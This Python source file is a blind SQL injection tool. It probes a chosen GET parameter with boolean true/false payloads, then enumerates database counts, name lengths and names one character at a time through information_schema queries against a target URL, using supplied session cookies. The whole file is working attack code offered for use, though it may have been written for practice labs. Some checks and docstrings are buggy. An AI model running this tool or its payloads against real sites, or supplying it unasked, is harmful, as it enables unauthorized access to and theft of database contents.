import sys
import argparse
import requests
from colorama import init, Fore
import re
import time
import string

def init_parser() -> argparse.ArgumentParser:
    '''Initialize argument parser.
    
    Returns:
        - `ArgumentParser` with configured arguments
    '''
    parser = argparse.ArgumentParser(
        description="Simple program to detect Blind-based SQL Injections."
    )
    parser.add_argument('-u', '--url', type=str, help='SQL Injection whole URL', nargs='?', default='', required=True)
    parser.add_argument('-g', '--get-param', type=str, help='GET parameter', nargs='?', default='', required=True)
    parser.add_argument(
        '-c',
        '--cookies',
        type=lambda x: { k:v for k,v in (i.split('=') for i in x.split(',')) },
        help='Cookies to set, divided by commas')

    return parser


def check_authentication(url, cookies={'':''}) -> int:
    '''
    Check arguments and ask the user if the site is the final site desired.
    
    Arguments:
        - `url`: site the user wants to access.
        - `cookies`: cookies of the user session to be able to access the URL.

    Returns:
        - `int`: 0 or 1 if the user has been able to access the correct URL, trusting on his input.
    '''
    print(Fore.CYAN + 'Trying to access the URL ...')
    time.sleep(0.5)
    
    request_text = requests.get(url, cookies=cookies).text
    title_pattern = r'<title>.+</title>'
    title_found = re.search(title_pattern, request_text)
    
    print(Fore.YELLOW + 'The title of the site being accessed is:')
    print(Fore.WHITE + f"\t{title_found.group(0)}")
    print(Fore.YELLOW + 'Is this correct?\nIf not, you might need to provide the cookie to be able to access the URL')

    user_answer = input('[Y/n] ')
    if re.search(r'([^y|^Y])', user_answer):
        return 1
    
    return 0


def first_sql_injection(url, get_param, cookies, injection_type) -> int:
    '''
    Identify if it is possible to inject through SQL the GET parameter provided by the user.
    
    Arguments:
        - `url`: site the user wants to access.
        - `get_param`: GET parameter to check if its injectable.
        - `cookies`: cookies of the user session to be able to access the URL.
        - `injection_type`: type of injection to test the SQL injection.

    Returns:
        - `int`: 0 if the GET parameter provided is injectable, 1 if it is injectable.
    '''
    injectable_1 = ''
    injectable_2 = ''

    if injection_type == 'integers':
        injectable_1 = '1 and 1=1'
        injectable_2 = '1 and 1=0'
    elif injection_type == 'simple_quotes':
        injectable_1 = "1' and '1'='1"
        injectable_2 = "1' and '1'='0"
    elif injection_type == 'double_quotes':
        injectable_1 = "1\" and \"1\"=\"1"
        injectable_2 = "1\" and \"1\"=\"0"

    pattern = rf'\?({get_param}\=.+)(\&)'
    parameter_found = re.search(pattern, url)
    split_url = url.split(parameter_found.group(1))
    
    # First injection
    new_url_1 = split_url[0] + f"{get_param}={injectable_1}" + split_url[1]
    print(Fore.CYAN + f"Trying with URL: {new_url_1} ...")
    r_option_1_1 = requests.get(new_url_1, cookies=cookies).text
    answer_option_1_1 = re.search(rf'<pre>(.+)</pre>', r_option_1_1)

    # Second injection
    new_url_2 = split_url[0] + f"{get_param}={injectable_2}" + split_url[1]
    print(Fore.CYAN + f"Trying with URL: {new_url_2} ...")
    r_option_1_2 = requests.get(new_url_2, cookies=cookies).text
    answer_option_1_2 = re.search(rf'<pre>(.+)</pre>', r_option_1_2)

    if answer_option_1_1.group(1) == answer_option_1_2.group(1): 
        print(Fore.RED + f"Your GET parameter `{get_param}` is not injectable through {injection_type}.")
        return 1
    
    return 0


def identify_vulnerability(url, get_param, cookies={'':''}) -> str:
    '''
    Identify the SQL Injection in the given URL, using the given GET parameter and the given cookies, if needed.
    
    Arguments:
        - `url`: site the user wants to access.
        - `get_param`: GET parameter to check if its injectable.
        - `cookies`: cookies of the user session to be able to access the URL.

    Returns:
        - `int`: 0 if the URL is vulnerable, 1 if it is not vulnerable to SQL injection.
    '''
    print(Fore.CYAN + 'Analyzing the URL and the GET parameter you provided ...')
    time.sleep(0.75)

    injectable = ''
    # 1º option: 1 and 1=1 | 1 and 1=0
    if first_sql_injection(url, get_param, cookies, 'integers') == 0:
        injectable = 'integers'
    # 2º option: 1' and '1'='1 | 1' and '1'='0
    if first_sql_injection(url, get_param, cookies, 'simple_quotes') == 0:
        injectable = 'simple quotes'
    # 3º option: 1" and "1"="1 | 1" and "1"="0
    if first_sql_injection(url, get_param, cookies, 'double_quotes') == 0:
        injectable = 'double quotes'
    
    if injectable == '':
        print(Fore.RED + f"Your GET parameter `{get_param}` is not injectable, sorry.")
    print(Fore.GREEN + f"Your GET parameter `{get_param}` is injectable through {injectable}!")
    return injectable


def iterative_request(url, get_param, cookies, payload, is_char=False) -> int|str:
    '''
    Iterate on the payload given into an specific site to determine whether a 200 code is displayed.
    
    Arguments:
        - `url`: site the user wants to access.
        - `get_param`: GET parameter to check if its injectable.
        - `cookies`: cookies of the user session to be able to access the URL.
        - `payload`: string to inject.
        - `is_char`: boolean to know if the request iterates on characters or on numbers.

    Returns:
        - `int` or `str`: The number or character limit at which a 200 status code is displayed.
    '''
    found = False
    limit = 0
    result_value = None

    while not found:
        limit += 10
        for value in (string.ascii_lowercase + '_') if is_char else range(limit):
            new_payload =  str(payload.replace('iterate', '\'{}\'')).format(value) if is_char else str(payload.replace('iterate', '{}')).format(value)

            pattern = rf'\?({get_param}\=.+)(\&)'
            parameter_found = re.search(pattern, url)
            split_url = url.split(parameter_found.group(1))
            url_injected = split_url[0] + f"{get_param}={new_payload}" + split_url[1]
            
            print(Fore.CYAN + f"Trying with URL: {url_injected} ...")
            request = requests.get(url_injected ,cookies=cookies)
            
            if request.status_code == 200:
                found = True
                result_value = value
            if found: break
    return result_value


def identify_db(url, get_param, cookies, injectable):
    '''
    Identify the number and names of the databases.
    
    Arguments:
        - `url`: site the user wants to inject.
        - `get_param`: GET parameter to be injected.
        - `cookies`: cookies of the user session to be able to access the URL.
    '''
    print(Fore.CYAN + 'Identifying databases ...')
    time.sleep(0.75)

    payload_db = ''
    payload_length = ''
    payload_name = ''
    _injectable = injectable.replace(' ', '_')

    if _injectable == 'integers':
        payload_db = "1 and (select count(schema_name) from information_schema.schemata)=iterate -- -"
        payload_length = "1 and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -"
        payload_name = "1 and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
    elif _injectable == 'simple_quotes':
        payload_db = "1' and (select count(schema_name) from information_schema.schemata)=iterate -- -"
        payload_length = "1' and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -"
        payload_name = "1' and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
    elif _injectable == 'double_quotes':
        payload_db = "1\" and (select count(schema_name) from information_schema.schemata)=iterate -- -"
        payload_length = "1\" and (select length(schema_name) from information_schema.schemata limit {i},1)=iterate -- -"
        payload_name = "1\" and substring((select schema_name from information_schema.schemata limit {i},1),{n_char},1)=iterate -- -"
    
    n_database = iterative_request(url, get_param, cookies, payload_db)
    print(Fore.LIGHTGREEN_EX + f"The number of databases is {n_database}")

    for i in range(n_database):
        print(Fore.LIGHTCYAN_EX + f"\t>>> Database {i+1} ...")
        time.sleep(0.75)
        if (i == 0):
            print(Fore.YELLOW + '\tSkipping INFORMATION_SCHEMA ...')
            continue
        length_db = iterative_request(url, get_param, cookies, payload_length.format(i=i))
        print(Fore.LIGHTCYAN_EX + f"\t>>>>> LENGTH: {length_db}")
        
        db_name = ''
        for n_char in range(length_db):
            db_name += iterative_request(url, get_param, cookies, payload_name.format(i=i, n_char=n_char+1), is_char=True)
        print(Fore.LIGHTCYAN_EX + f"\t>>>>> NAME: {db_name}")
        

def main() -> int:
    init(autoreset=True)
         
    '''Initial check.'''
    parser=init_parser()
    args=parser.parse_args()

    try:
        code = check_authentication(args.url, args.cookies)
        if code == 1:
            print(Fore.RED + '\nYou might need a cookie to continue with the exploitation.\n')
            return 1
        print(Fore.GREEN + "Site reached!  Let's continue with the adventure ...\n")

        '''Identify and extract vulnerabilities.'''
        injectable = identify_vulnerability(args.url, args.get_param, args.cookies)
        if injectable == '':
            print(Fore.RED + f"Sorry, the URL you provided is not injectable through the GET parameter `{args.get_param}`")
            return 1
        print(Fore.GREEN + f"Your URL is vulnerable to SQL Injection!\n")
        
        '''Extract information from the database (default behaviour).'''
        # TODO: depending on the input of the user, by default extract databases of the site
        identify_db(args.url, args.get_param, args.cookies, injectable)

        print(Fore.GREEN + '\nDatabase recognition finished!!')
    except Exception as err:
        print(Fore.LIGHTRED_EX + f"Unexpected {err=}, {type(err)=}")
        return 1

    return 0

   
if __name__ == '__main__':
    sys.exit(main())
